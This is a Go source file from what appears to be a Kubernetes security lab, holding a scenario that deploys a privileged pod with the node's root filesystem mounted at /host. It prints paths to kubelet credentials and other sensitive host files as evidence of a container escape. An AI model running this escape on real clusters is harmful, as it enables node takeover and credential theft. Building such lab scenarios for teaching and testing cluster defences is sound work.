package scenarios

import (
	"context"
	"fmt"
	"time"

	"k8s-security-lab/internal/cluster"

	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

func EscapeAttack() error {

	fmt.Println("[*] Starting container escape scenario")

	client, err := cluster.GetClient()
	if err != nil {
		return err
	}

	namespace := "tenant-a"
	podName := "escape-attacker"

	fmt.Println("[*] Deploying privileged pod")

	pod := &corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      podName,
			Namespace: namespace,
		},
		Spec: corev1.PodSpec{

			ServiceAccountName: "tenant-sa",

			Containers: []corev1.Container{
				{
					Name:  "escape",
					Image: "alpine",
					Command: []string{
						"sleep",
						"3600",
					},

					SecurityContext: &corev1.SecurityContext{
						Privileged: boolPtr(true),
					},

					VolumeMounts: []corev1.VolumeMount{
						{
							Name:      "host-root",
							MountPath: "/host",
						},
					},
				},
			},

			Volumes: []corev1.Volume{
				{
					Name: "host-root",
					VolumeSource: corev1.VolumeSource{
						HostPath: &corev1.HostPathVolumeSource{
							Path: "/",
						},
					},
				},
			},
		},
	}

	_, err = client.CoreV1().
		Pods(namespace).
		Create(context.Background(), pod, metav1.CreateOptions{})

	if err != nil {
		return err
	}

	fmt.Println("[+] Privileged pod deployed")

	fmt.Println("[*] Waiting for pod to start")

	time.Sleep(5 * time.Second)

	fmt.Println("[*] Host filesystem mounted at /host")

	fmt.Println("\nEvidence:")

	fmt.Println("Inside the container an attacker can access:")

	fmt.Println(`
ls /host/etc
ls /host/root
ls /host/var/lib/kubelet
`)

	fmt.Println("\nImpact:")

	fmt.Println("- Access node filesystem")
	fmt.Println("- Read Kubernetes kubelet credentials")
	fmt.Println("- Access other pod volumes")

	return nil
}

func boolPtr(b bool) *bool {
	return &b
}
